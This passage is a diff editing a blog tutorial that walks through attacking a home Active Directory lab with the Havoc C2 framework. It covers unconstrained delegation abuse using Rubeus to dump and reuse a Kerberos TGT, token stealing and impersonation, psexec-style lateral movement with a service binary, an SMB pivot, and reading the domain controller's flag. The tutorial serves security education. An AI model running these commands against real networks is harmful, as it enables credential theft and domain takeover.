-After knowing **WORKSTATION-02** are set under unconstrained delegation, [`Rubeus.exe`](https://github.com/GhostPack/Rubeus) will be heavily utilized in this section, especially kerberos topics. By extracting and harvesting the kerberos tickets, use `Rubeus.exe triage` to grab all current tickets contains parameters such as login ID (LUID), domain username, services, and end time.
+For exploitation, [`Rubeus.exe`](https://github.com/GhostPack/Rubeus) will be used to extract and harvests the kerberos tickets. Use `Rubeus.exe triage` to grab all active tickets containing parameters such as login ID (LUID), domain username, services, and end time.
 
 ```
 06/03/2023 15:31:18 [5pider] Demon » dotnet inline-execute /home/havoc/Desktop/Tools/Rubeus/Rubeus/bin/Debug/Rubeus.exe triage
@@ -471,9 +469,9 @@ Action: Triage Kerberos Tickets (All Users)
  | 0x1eda980 | m.seitz @ HAVOC.LOCAL         | ldap/DC01.havoc.local             | 6/3/2023 7:02:06 AM  |
 ```
 
-> **WORKSTATION-01** was configured that `m.seitz` has login record. Try login again with `m.seitz` in **WORKSTATION-01** if LUID of `m.seitz` is not existed.
+> **WORKSTATION-01** is configured specifically so that `m.seitz` will always have an active logon session on the computer. Try login again with `m.seitz` in **WORKSTATION-01** if LUID of `m.seitz` does not exists for you.
 
-As mentioned above, we want accounts such as `m.seitz`, or Domain Admins even better to move laterally to **WORKSTATION-02**. Copy the LUID of `m.seitz` and dump or extract out the TGTs.
+As mentioned above, we want high-values domain users such as `m.seitz`, or Domain Admins to move laterally into **WORKSTATION-02**. Copy the LUID of `m.seitz` and dump the TGTs.
 
 ```
 06/03/2023 15:34:11 [5pider] Demon » dotnet inline-execute /home/havoc/Desktop/Tools/Rubeus/Rubeus/bin/Debug/Rubeus.exe dump /luid:0x1eda980 /nowrap
@@ -515,7 +513,7 @@ Action: Dump Kerberos Ticket Data (All Users)
       doIFejCC[...]TE9DQUw=
 ```
 
-After extracting the TGT, we can leverage it via a new logon session by using `Rubeus.exe createnetonly`. The `/password` parameter can be anything as long as the `/domain`, `/username`, and `/ticket` parameters are correct.
+After extracting the TGT, we can leverage it to a new logon session by using `Rubeus.exe createnetonly`. The `/password` parameter can be anything as long as the `/domain`, `/username`, and `/ticket` parameters are correct.
 
 ```
 06/03/2023 15:36:21 [5pider] Demon » dotnet inline-execute /home/havoc/Desktop/Tools/Rubeus/Rubeus/bin/Debug/Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:HAVOC /username:m.seitz /password:FakePass /ticket:doIFejCC[...]TE9DQUw=
@@ -540,11 +538,11 @@ After extracting the TGT, we can leverage it via a new logon session by using `R
 [+] LUID            : 0x2f60ba7
 ```
 
-Rubeus creates a new process with incorrect credentials with a new Process ID generated. Next, we need to steal the newly created process. In Cobalt Strike, red team operators just only require to `steal token 4160` in order to perform directory listing. While in Havoc Framework, an additional impersonation needs to be done after stealing the token (a.k.a. ProcessID). To steal the token, the syntax is `token steal [ProcessID]`.
+Rubeus creates a new process with an incorrect credentials, along with a newly generated Process ID (PID). Next, we need to steal the token of the newly created process. To steal the process token, the syntax will be `token steal [ProcessID]`.
 
-By typing `token list`, you can observe the token vault. Any token stole or made by operators will be stored in the token vault.
+By typing `token list`, you can list out all the stolen tokens from the token vault.
 
-To impersonate another user, the syntax is `token impersonate [Token ID]`. The Token ID can be found in the token vault.
+To impersonate a token, the syntax is `token impersonate [Token ID]`. The Token ID can be found in the token vault.
 
 ```
 06/03/2023 15:37:40 [5pider] Demon » token steal 4160
@@ -567,7 +565,7 @@ To impersonate another user, the syntax is `token impersonate [Token ID]`. The T
 [+] Successful impersonated 
 ```
 
-After token impersonation, list the directory in WORKSTATION-02. When you are able to list out the directory in another machine, you can retrieve the flag out at this point.
+After token impersonation, list the directory in WORKSTATION-02. When you are able to list out the directory in another machine, you can retrieve the flag out at this stage.
 
 ```
 05/03/2023 23:17:22 [5pider] Demon » dir \\WORKSTATION-02.havoc.local\C$
@@ -594,12 +592,12 @@ After token impersonation, list the directory in WORKSTATION-02. When you are ab
               dir      05/03/2023 24:15:23   Windows 
 ```
 
-Here is the video walkthrough regarding Unconstrained Delegation attack.
+Here is the video walkthrough covering Unconstrained Delegation vulnerability.
 
 {% include video id="sHB_REMIJNQ" provider="youtube" %}
 
 ### ⏫ Lateral Movement
-At the end of this section, you will also able to get a demon callback from WORKSTATION-02 in WORKSTATION-01 using Server Message Block (SMB) pivot connect.
+At the end of this section, you will also able to get a demon callback from WORKSTATION-02 using Server Message Block (SMB) pivot connect from WORKSTATION-01.
 
 ![image](https://user-images.githubusercontent.com/107750005/222970318-730d3947-bbf5-489e-8e18-38ec3b9f98da.png)
 
@@ -621,11 +619,11 @@ The most convenient is to use the built-in `jump-exec psexec` command - the synt
   psexec                    executes specified service on target host
 ```
 
-Create another listener with SMB protocol selected and generate a service binary ( `Windows Service EXE` ) using that listener.
+Create another listener with SMB protocol selected and generate a new service binary ( `Windows Service EXE` ) using that listener.
 
-The `jump-exec psexec` command work by uploading a service binary to the target system, then creating and starting a Windows service to execute that binary. Similar as Cobalt Strike, Demons executed this way run as `SYSTEM` instead of user accounts. After launching the command, Havoc will start the service executable automatically in the remote target.
+The `jump-exec psexec` command work by uploading a service binary to the target system, then creating and starting a Windows service to execute that binary. Similar as Cobalt Strike, Demons executed using this method will always return a demon callback under the context of `SYSTEM` instead of user accounts due to the involvement of Service Control Manager. After launching the command, Havoc will start the service executable automatically in the remote target.
 
-> Take note that, the `[Service Name]` in the `jump-exec psexec` command must insert **DemonSvc** as the Service Name when generating the service binary is `DemonSvc` by default. Additionally, do not change the default name of the service binary as it might not work with some reasons.
+> Take note that, the `[Service Name]` from the `jump-exec psexec` command must be **DemonSvc** when generating the service binary, as it is the default name. Additionally, do not change the default name of the service binary as it might not work for some unknown reasons.
 
 ```
 05/03/2023 23:20:57 [5pider] Demon » jump-exec psexec WORKSTATION-02 DemonSvc /home/havoc/Desktop/Payloads/demon_svc.exe
@@ -638,7 +636,7 @@ The `jump-exec psexec` command work by uploading a service binary to the target 
 [+] psexec successful executed on WORKSTATION-02
 ```
 
-Lastly, link the WORKSTATION-02 to WORKSTATION-01 with `pivot connect` module. The syntax is `pivot connect [COMPUTER] [pipe name]`. You are able to read the flag if you have not retrieved the flag in the previous section.
+Lastly, link the WORKSTATION-02 to WORKSTATION-01 with `pivot connect` module. The syntax is `pivot connect [COMPUTER] [pipe name]`. You can now retrieve the flag if you have not do so in the previous section.
 
 ```
 05/03/2023 23:22:20 [5pider] Demon » pivot connect WORKSTATION-02 smbpipe
@@ -646,14 +644,14 @@ Lastly, link the WORKSTATION-02 to WORKSTATION-01 with `pivot connect` module. T
 [+] [SMB] Connected to pivot agent [31ea884a]---[7436745a]
 ```
 
-Here is the video walkthrough regarding Lateral Movement using default lateral movement module in Havoc Framework.
+Here is the video walkthrough to demonstrate Lateral Movement in Havoc Framework.
 
 {% include video id="4gy-3BAiQmY" provider="youtube" %}
 
 ### ⛓️ Pivoting
-Due to the maturity and stability of Havoc Framework, pivoting attacks such as NTLM Relaying, SSH Tunneling, autorouting, etc. are relatively difficult to operate. However, here is a simple way of getting the final flag out using **token impersonation** method. (Assume that you somehow successfully retrieve the password of one of the Domain Admins.)
+Due to the current state of Havoc Framework, many pivoting attacks such as NTLM Relaying, SSH Tunneling, autorouting, etc. are relatively difficult to operate and unstable. However, here is a simple way of getting the final flag using **token impersonation** method. (Assuming that you somehow successfully retrieve the password of any Domain Admins.)
 
-In WORKSTATION-01 or WORKSTATION-02 demon, type the following commands to retrieve the final flag without logging in the Domain Controller user interface. 
+From the demon of WORKSTATION-01 or WORKSTATION-02, type the following commands to retrieve the final flag without logging in the Domain Controller via user interface. 
 
 ```
 06/03/2023 15:15:39 [5pider] Demon » dir \\DC01.havoc.local\C$
@@ -725,17 +723,15 @@ In WORKSTATION-01 or WORKSTATION-02 demon, type the following commands to retrie
 HAVOC{c7394fc9e54b0e362b5a610e0ef6a3e0}
 ```
 
-Here is a great blog by Rastamouse discuss about [NTLM Relaying via Cobalt Strike](https://rastamouse.me/ntlm-relaying-via-cobalt-strike/). We will continue update this section if any method available without knowing the credentials of Domain Admins.
+For additional references, here is a great blog by Rastamouse discussing about [NTLM Relaying via Cobalt Strike](https://rastamouse.me/ntlm-relaying-via-cobalt-strike/). We will continue to update this section if any method that allows us to pivot without knowing the credentials of Domain Admins are made publicly available.
 
-With NTLM Relaying applied, the whole compromise process should be look such as the figure below (but we unable to do it). This figure below is referenced from the [youtube video demonstration](https://www.youtube.com/watch?v=a8ghTH_fT_o&t=8s&ab_channel=5pider) by [C5pider](https://github.com/Cracked5pider).
+With NTLM Relaying applied, the whole compromise process should look something similar to the figure below. The figure below is taken from the [youtube video demonstration](https://www.youtube.com/watch?v=a8ghTH_fT_o&t=8s&ab_channel=5pider) by [C5pider](https://github.com/Cracked5pider).
 
 ![image](https://user-images.githubusercontent.com/107750005/223200209-43e2ea67-b5aa-478d-8067-fcd4a9016ca9.png)
 ![image](https://user-images.githubusercontent.com/107750005/223196736-da6a9aac-b6ff-479b-8b27-b5fc9f8d89e5.png)
 
 ## 🗣️ Conclusion
-Throughout this blog, we had covered a short introduction about what is Active Directory and a little sneak peak about Kerberos authentication. Then, we ensure that our AD lab environment is totally functional by doing some network verifications before diving into the fun stuffs. Moreover, we have gone through how attackers can bypass Windows AV and get a callback host by utilizing HAVOC framework. Besides that, one example attack in each stage had been discussed including ***unquoted service paths***, ***unconstrained delegation***, and ***pivoting attacks***. and eventually compromise the whole domain.
-
-In conclusion, I hope this article is detailed enough to benefit people for learning interesting topics and apply these gains to related work such as education, certification exams, projects, home lab practice, and more. (but not for illegal actions 💀 plzzz...) Happy Hacking!
+I hope that this article is detailed enough to benefit people to learn interesting topics and apply these knowledge to related work such as education, certification exams, projects, home lab practice, and more. (but not for illegal actions 💀 plzzz...) Happy Hacking!
 
 ## 🟦 References
 
